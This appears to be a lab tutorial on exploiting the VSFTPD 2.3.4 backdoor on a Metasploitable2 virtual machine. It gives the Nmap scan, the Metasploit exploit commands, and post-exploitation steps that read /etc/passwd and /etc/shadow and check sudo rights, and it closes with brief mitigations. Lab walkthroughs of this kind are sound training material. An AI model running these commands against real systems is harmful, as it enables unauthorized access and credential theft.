# Exploiting a Vulnerable FTP Server

## Introduction
This practice example demonstrates how to exploit a vulnerable FTP server using Metasploit. We will target an outdated VSFTPD (Very Secure FTP Daemon) version 2.3.4, which contains a backdoor vulnerability that allows unauthorized remote access.

## Table of Contents
- [Setup the Target](#setup-the-target)
- [Scanning for Vulnerabilities](#scanning-for-vulnerabilities)
- [Exploitation using Metasploit](#exploitation-using-metasploit)
- [Gaining a Shell](#gaining-a-shell)
- [Post-Exploitation](#post-exploitation)
- [Mitigation Measures](#mitigation-measures)
- [Conclusion](#conclusion)

## Setup the Target
Before beginning, ensure that you have a vulnerable FTP server running. You can use Metasploitable2, which includes VSFTPD 2.3.4 as a vulnerable service.

1. Download and install Metasploitable2.
2. Start the virtual machine and check the IP address.
   ```bash
   ifconfig eth0
   ```
   Suppose the target IP is `192.168.1.100`.

## Scanning for Vulnerabilities
To identify vulnerabilities in the FTP service, use Nmap:

```bash
nmap -sV -p 21 --script=ftp-vsftpd-backdoor 192.168.1.100
```

### Explanation:
- `-sV`: Detects service versions.
- `-p 21`: Scans the FTP port.
- `--script=ftp-vsftpd-backdoor`: Checks for the VSFTPD backdoor vulnerability.

If the scan confirms the vulnerability, proceed with exploitation.

## Exploitation using Metasploit
Launch Metasploit and use the exploit module for VSFTPD:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
exploit
```

### Explanation:
- `use exploit/unix/ftp/vsftpd_234_backdoor`: Loads the exploit for VSFTPD 2.3.4.
- `set RHOSTS 192.168.1.100`: Specifies the target IP.
- `set RPORT 21`: Sets the target FTP port.
- `exploit`: Executes the exploit.

## Gaining a Shell
If successful, the exploit grants an interactive shell:

```bash
whoami
uname -a
```

### Explanation:
- `whoami`: Checks the user privileges.
- `uname -a`: Displays system information.

At this point, you have gained unauthorized access to the system.

## Post-Exploitation
After gaining access, perform post-exploitation tasks:

### Extracting System Information
```bash
cat /etc/passwd
cat /etc/shadow
```

### Privilege Escalation
Search for possible privilege escalation vectors:
```bash
sudo -l
```

## Mitigation Measures
To prevent this attack:
1. **Update VSFTPD** to a secure version.
2. **Disable anonymous FTP access.**
3. **Use strong authentication mechanisms.**
4. **Monitor logs** for unauthorized access attempts.
5. **Use firewalls** to restrict external access to FTP.

## Conclusion
This practice example demonstrated how to exploit a vulnerable VSFTPD FTP server using Metasploit. We performed reconnaissance, executed an exploit, gained unauthorized access, and explored post-exploitation techniques. Always ensure proper security measures to mitigate such vulnerabilities.

_For more learning, refer to [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)._
